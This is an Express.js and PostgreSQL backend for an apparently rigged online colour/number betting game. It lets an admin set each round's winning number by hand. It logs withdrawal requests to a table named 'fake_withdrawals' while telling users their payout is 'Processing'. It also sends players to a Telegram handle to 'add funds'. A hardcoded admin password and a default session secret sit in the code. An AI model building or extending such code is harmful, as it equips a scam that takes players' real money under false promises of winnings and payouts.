const express = require('express');
const session = require('express-session');
const { Pool } = require('pg');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Database connection
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false }
});

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Session configuration
app.use(session({
    secret: process.env.SESSION_SECRET || 'clerk-club-secret-key',
    resave: false,
    saveUninitialized: false,
    proxy: true,
    cookie: {
        secure: false,
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000
    }
}));

// Admin credentials
const ADMIN_USERNAME = 'admin';
const ADMIN_PASSWORD = 'NINAD';

// ============ ADMIN AUTH ============

app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
        req.session.isAdmin = true;
        res.json({ success: true, redirect: '/admin.html' });
    } else {
        res.json({ success: false });
    }
});

app.get('/api/admin/check', (req, res) => {
    res.json({ isAdmin: req.session.isAdmin === true });
});

app.post('/api/admin/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.get('/admin.html', (req, res) => {
    if (req.session.isAdmin) {
        res.sendFile(path.join(__dirname, 'admin.html'));
    } else {
        res.sendFile(path.join(__dirname, 'login.html'));
    }
});

function requireAdmin(req, res, next) {
    if (req.session.isAdmin) {
        next();
    } else {
        res.status(401).json({ error: 'Unauthorized' });
    }
}

// ============ GAME APIs ============

app.get('/api/game/status', async (req, res) => {
    try {
        const currentPeriod = await pool.query(
            `SELECT * FROM game_periods WHERE status = 'active' ORDER BY end_time DESC LIMIT 1`
        );
        
        const lastResult = await pool.query(
            `SELECT winning_number, winning_color, winning_big_small 
             FROM game_periods WHERE status = 'completed' ORDER BY end_time DESC LIMIT 1`
        );
        
        let timer = '01:00';
        let periodId = 'WGO-1M-001';
        
        if (currentPeriod.rows[0]) {
            const period = currentPeriod.rows[0];
            periodId = period.id;
            const now = new Date();
            const endTime = new Date(period.end_time);
            const diff = Math.max(0, Math.floor((endTime - now) / 1000));
            const minutes = Math.floor(diff / 60);
            const seconds = diff % 60;
            timer = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        res.json({
            period_id: periodId,
            timer: timer,
            last_result: lastResult.rows[0] || null
        });
    } catch (error) {
        res.json({ period_id: 'WGO-1M-001', timer: '01:00', last_result: null });
    }
});

app.get('/api/user/balance', async (req, res) => {
    let userId = req.session.userId;
    if (!userId) {
        const result = await pool.query(
            `INSERT INTO users (username, virtual_balance) VALUES ($1, 100) RETURNING id, virtual_balance`,
            [`user_${Date.now()}`]
        );
        req.session.userId = result.rows[0].id;
        return res.json({ balance: 100 });
    }
    
    const user = await pool.query(`SELECT virtual_balance FROM users WHERE id = $1`, [userId]);
    res.json({ balance: user.rows[0]?.virtual_balance || 100 });
});

app.post('/api/bet', async (req, res) => {
    const { number, amount } = req.body;
    let userId = req.session.userId;
    
    if (!userId) {
        const newUser = await pool.query(
            `INSERT INTO users (username, virtual_balance) VALUES ($1, 100) RETURNING id`,
            [`user_${Date.now()}`]
        );
        userId = newUser.rows[0].id;
        req.session.userId = userId;
    }
    
    try {
        const user = await pool.query(`SELECT virtual_balance FROM users WHERE id = $1`, [userId]);
        
        if (user.rows[0].virtual_balance < amount) {
            return res.json({ success: false, message: 'Insufficient balance! DM @clerkmm on Telegram to add funds.' });
        }
        
        const period = await pool.query(`SELECT * FROM game_periods WHERE status = 'active' LIMIT 1`);
        
        if (!period.rows[0]) {
            return res.json({ success: false, message: 'No active game period' });
        }
        
        await pool.query(
            `INSERT INTO bets (user_id, period_id, amount, predicted_number, status) 
             VALUES ($1, $2, $3, $4, 'pending')`,
            [userId, period.rows[0].id, amount, number]
        );
        
        await pool.query(
            `UPDATE users SET virtual_balance = virtual_balance - $1, total_bet = total_bet + $1 WHERE id = $2`,
            [amount, userId]
        );
        
        const newBalance = await pool.query(`SELECT virtual_balance FROM users WHERE id = $1`, [userId]);
        
        res.json({ success: true, balance: newBalance.rows[0].virtual_balance });
    } catch (error) {
        res.json({ success: false, message: 'Error placing bet' });
    }
});

app.post('/api/withdraw', async (req, res) => {
    const { upi_id, amount } = req.body;
    let userId = req.session.userId;
    
    if (!userId) {
        return res.json({ success: false, message: 'Please login first' });
    }
    
    await pool.query(
        `INSERT INTO fake_withdrawals (user_id, amount, upi_id, status) VALUES ($1, $2, $3, 'processing')`,
        [userId, amount, upi_id]
    );
    
    res.json({ success: true, message: 'Withdrawal request submitted! Status: Processing (Usually takes 10-20 mins)' });
});

// ============ ADMIN APIs ============

app.post('/api/admin/set-result', requireAdmin, async (req, res) => {
    const { winning_number } = req.body;
    
    if (winning_number < 0 || winning_number > 9) {
        return res.json({ success: false, message: 'Number must be 0-9' });
    }
    
    let winning_color = '';
    if ([1, 3, 7, 9].includes(winning_number)) winning_color = 'Green';
    else if ([2, 4, 6, 8].includes(winning_number)) winning_color = 'Red';
    else winning_color = 'Violet';
    
    const winning_big_small = winning_number >= 5 ? 'Big' : 'Small';
    
    try {
        const currentPeriod = await pool.query(
            `SELECT * FROM game_periods WHERE status = 'active' LIMIT 1`
        );
        
        if (currentPeriod.rows[0]) {
            await pool.query(
                `UPDATE game_periods 
                 SET winning_number = $1, winning_color = $2, winning_big_small = $3, 
                     status = 'completed', result_revealed = TRUE 
                 WHERE id = $4`,
                [winning_number, winning_color, winning_big_small, currentPeriod.rows[0].id]
            );
            
            const bets = await pool.query(
                `SELECT * FROM bets WHERE period_id = $1 AND status = 'pending'`,
                [currentPeriod.rows[0].id]
            );
            
            for (const bet of bets.rows) {
                if (bet.predicted_number === winning_number) {
                    const winAmount = bet.amount * 9;
                    await pool.query(
                        `UPDATE users SET virtual_balance = virtual_balance + $1, total_win = total_win + $1 WHERE id = $2`,
                        [winAmount, bet.user_id]
                    );
                    await pool.query(
                        `UPDATE bets SET status = 'won', win_amount = $1 WHERE id = $2`,
                        [winAmount, bet.id]
                    );
                } else {
                    await pool.query(`UPDATE bets SET status = 'lost' WHERE id = $1`, [bet.id]);
                }
            }
        }
        
        const nextPeriodId = `WGO-1M-${String(Date.now()).slice(-6)}`;
        const startTime = new Date();
        const endTime = new Date(startTime.getTime() + 60000);
        
        await pool.query(
            `INSERT INTO game_periods (id, start_time, end_time, status) VALUES ($1, $2, $3, 'active')`,
            [nextPeriodId, startTime, endTime]
        );
        
        res.json({ success: true, message: `Result set to ${winning_number} (${winning_color}, ${winning_big_small})` });
    } catch (error) {
        res.json({ success: false, message: 'Database error' });
    }
});

app.post('/api/admin/add-funds', requireAdmin, async (req, res) => {
    const { user_id, amount } = req.body;
    
    if (!amount || amount <= 0) {
        return res.json({ success: false, message: 'Invalid amount' });
    }
    
    try {
        const user = await pool.query(`SELECT * FROM users WHERE id = $1 OR username = $1`, [user_id]);
        
        if (user.rows.length === 0) {
            return res.json({ success: false, message: 'User not found' });
        }
        
        await pool.query(`UPDATE users SET virtual_balance = virtual_balance + $1 WHERE id = $2`, [amount, user.rows[0].id]);
        
        res.json({ success: true, message: `Added ₹${amount} to ${user.rows[0].username}` });
    } catch (error) {
        res.json({ success: false, message: 'Database error' });
    }
});

app.get('/api/admin/user', requireAdmin, async (req, res) => {
    const { search } = req.query;
    
    try {
        const user = await pool.query(
            `SELECT id, username, phone, virtual_balance, total_bet, total_win, created_at 
             FROM users WHERE id = $1 OR username = $1 OR phone = $1`,
            [search]
        );
        
        if (user.rows.length === 0) {
            return res.json({ error: 'User not found' });
        }
        
        res.json(user.rows[0]);
    } catch (error) {
        res.json({ error: 'Database error' });
    }
});

app.get('/api/admin/withdrawals', requireAdmin, async (req, res) => {
    try {
        const withdrawals = await pool.query(
            `SELECT w.*, u.username 
             FROM fake_withdrawals w 
             JOIN users u ON w.user_id = u.id 
             ORDER BY w.requested_at DESC 
             LIMIT 50`
        );
        res.json(withdrawals.rows);
    } catch (error) {
        res.json([]);
    }
});

app.get('/api/admin/bets', requireAdmin, async (req, res) => {
    try {
        const bets = await pool.query(
            `SELECT b.*, u.username 
             FROM bets b 
             JOIN users u ON b.user_id = u.id 
             ORDER BY b.placed_at DESC 
             LIMIT 50`
        );
        res.json(bets.rows);
    } catch (error) {
        res.json([]);
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});